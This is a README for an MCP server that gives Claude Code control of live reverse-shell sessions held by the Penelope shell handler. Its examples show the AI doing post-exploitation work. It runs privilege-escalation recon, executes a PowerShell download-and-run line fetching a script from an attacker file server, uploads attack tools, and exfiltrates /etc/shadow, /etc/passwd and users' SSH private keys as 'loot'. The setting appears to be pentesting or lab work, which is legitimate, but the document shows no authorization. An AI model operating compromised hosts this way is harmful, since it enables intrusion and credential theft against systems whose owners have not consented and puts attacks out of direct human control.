# Penelope MCP Server

Gives Claude Code direct access to live reverse-shell sessions managed by Penelope — list sessions, inspect targets, upload/download files and run commands, all from within a Claude conversation.

## How it works

```
Claude Code ──MCP stdio──► mcp_penelope.py ──Unix socket──► penelope.py ──TCP──► target
```

Penelope runs independently in a terminal. When it starts, it creates `~/.penelope/mcp.sock` (owner-only, mode 0600). The MCP server connects to that socket on each tool call. Claude Code launches `mcp_penelope.py` as a child process over stdio.

## Requirements

- Python 3.10+ (uses `int | None` union type hint)
- Penelope already running in a terminal before using the tools
- Claude Code CLI or VSCode extension

## Installation

### 1. Register the MCP server

The config file is already in place at `.mcp.json` in the repo root. If you're setting up a fresh clone or want to register it globally, add this to your Claude Code MCP config:

**Project-level** (`.mcp.json` in the repo root):
```json
{
  "mcpServers": {
    "penelope": {
      "command": "python3",
      "args": ["/YOURPATH/penelope/extras/mcp_penelope.py"]
    }
  }
}
```

**Global** (available in every project — use the CLI):
```bash
claude mcp add penelope python3 /YOURPATH/penelope/mcp_penelope.py
```

Or manually add to `~/.claude/claude_desktop_config.json`:
```json
{
  "mcpServers": {
    "penelope": {
      "command": "python3",
      "args": ["/YOURPATH/penelope/extras/mcp_penelope.py"]
    }
  }
}
```

### 2. Start Penelope in a terminal

```bash
# In a separate terminal (needs a real TTY)
python3 /opt/penelope/penelope.py
```

Penelope prints its listener address and creates `~/.penelope/mcp.sock`. The MCP tools will return an error if Penelope is not running.

### 3. Open Claude Code

The `penelope` MCP server is picked up automatically. You should see it listed when running:

```bash
claude mcp list
```

## Available tools

| Tool | Description |
|---|---|
| `list_sessions` | List all active reverse shells (id, ip, OS, type, user) |
| `get_session_info` | Full detail for one session (hostname, cwd, arch, shell subtype) |
| `exec_in_session` | Run a shell command and return its output |
| `kill_session` | Close and remove a session |
| `upload_to_session` | Upload local file(s) to a session using Penelope's native transfer |
| `download_from_session` | Download remote file(s) from a session using Penelope's native transfer |

## Usage examples

### Situational awareness

> "List all active Penelope sessions"

Claude calls `list_sessions` and returns a table. Example response:
```json
{
  "sessions": [
    {"id": 1, "ip": "10.10.14.23", "OS": "Unix", "type": "PTY", "subtype": "bash", "user": "www-data", "source": "reverse"},
    {"id": 2, "ip": "10.10.14.47", "OS": "Windows", "type": "Readline", "subtype": "cmd", "user": "HEAVEN\\fmercury", "source": "reverse"}
  ]
}
```

### Recon on a target

> "What's running on session 1? Check the OS, kernel version, and listening ports"

Claude calls `get_session_info` to confirm the OS, then chains `exec_in_session` calls:
```
uname -a
ss -tlnp
cat /etc/os-release
```

### Privilege escalation recon

> "Check if session 1 has any SUID binaries I can use for privesc"

Claude runs:
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Automated triage across all sessions

> "Run 'id' and 'hostname' on every active session and summarize"

Claude calls `list_sessions`, then `exec_in_session` for each id, and returns a summary table.

### Multi-step exploitation

> "Session 2 is a low-priv Windows shell. Download a PowerShell script from my file server at 10.10.14.1:8000/escalate.ps1 and run it"

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/escalate.ps1')
```

### Upload a tool to a target

> "Upload /arsenal/tools/silenthammer.sh to session 1"

Claude calls `upload_to_session`:
```json
{"session_id": 1, "local_path": "/arsenal/tools/silenthammer.sh"}
```
The file lands in the session's current working directory. To specify a destination:
```json
{"session_id": 1, "local_path": "/arsenal/tools/silenthammer.sh", "remote_path": "/tmp"}
```
Penelope handles encoding automatically (agent → stream pipe; non-agent → base64/tar; Windows → certutil).

### Download loot from a target

> "Download /etc/shadow and /etc/passwd from session 1"

Claude calls `download_from_session`:
```json
{"session_id": 1, "remote_path": "/etc/shadow /etc/passwd"}
```
Files are saved to `~/.penelope/sessions/<id>/downloads/`. Globs are supported:
```json
{"session_id": 1, "remote_path": "/home/*/.ssh/id_rsa"}
```

### Cleanup

> "Kill all sessions from 10.10.14.47"

Claude calls `list_sessions`, filters by ip, then calls `kill_session` for each match.

## Limits and known constraints

**`exec_in_session` blocks until the command returns.** Long-running commands (reverse shells, sleep loops, `nc` listeners) will hang the tool call until Penelope's short timeout fires. Use it for commands that produce output and exit.

**Output is capped at 10 MB per response.** Commands that produce large output (e.g., recursive directory listings, memory dumps) will return an error. Redirect to a file on the target and then read selectively.

**Commands are limited to 64 KB.** This is enough for any real shell command; it prevents accidental context window contents being sent as a command.

**Penelope must be running before Claude Code starts a conversation** (or before the first tool call). If you start Penelope after opening Claude Code, the tools will work immediately — no restart needed — because each call opens a fresh socket connection.

**`upload_to_session` and `download_from_session` block until the transfer completes.** Large files will hold the tool call open for the full transfer duration. There is no progress stream — the result arrives when Penelope finishes.

**Downloads are saved to Penelope's session directory, not the current working directory.** Files land at `~/.penelope/sessions/<id>/downloads/`. Use `exec_in_session` to confirm the file arrived on the target after an upload.

**`upload_to_session` returns an empty `uploaded` list on failure** (no write access, file not found, session not ready) rather than an error string. Check the list length to detect silent failures.

**PTY sessions behave differently from Raw sessions.** On PTY sessions, `exec_in_session` uses Penelope's agent path and returns clean output. On Raw sessions, it uses token-delimited shell wrapping. Both work, but Raw sessions on Windows may include CRLF line endings in the output.

## Security notes

- The Unix socket is `chmod 0600` — only your user can connect. No auth token is needed on a single-user machine.
- `exec_in_session` passes commands verbatim to the target shell with no validation. Treat it the same as having a shell open.
- Commands travel plaintext from Penelope to the target over TCP. Use `python3 penelope.py ssh user@pivot` to tunnel through SSH if the network is untrusted.
- Never expose `~/.penelope/mcp.sock` across a network mount or inside a shared-user container.

## Troubleshooting

**"Penelope is not running (socket not found)"**
Start Penelope in a terminal first: `python3 /YOURPATH/penelope/penelope.py`

**"exec failed or session not ready"**
The session may have died between `list_sessions` and the exec. Run `list_sessions` again to confirm the session is still alive.

**Tool calls time out with no response**
The command is likely blocking (waiting for input, producing no output). Send `Ctrl+C` to the session from the Penelope terminal to interrupt it.

**MCP server not listed in `claude mcp list`**
Check that `.mcp.json` exists in the project root and that `python3` resolves correctly in your shell. Test manually: `echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | python3 /opt/penelope/extras/mcp_penelope.py`
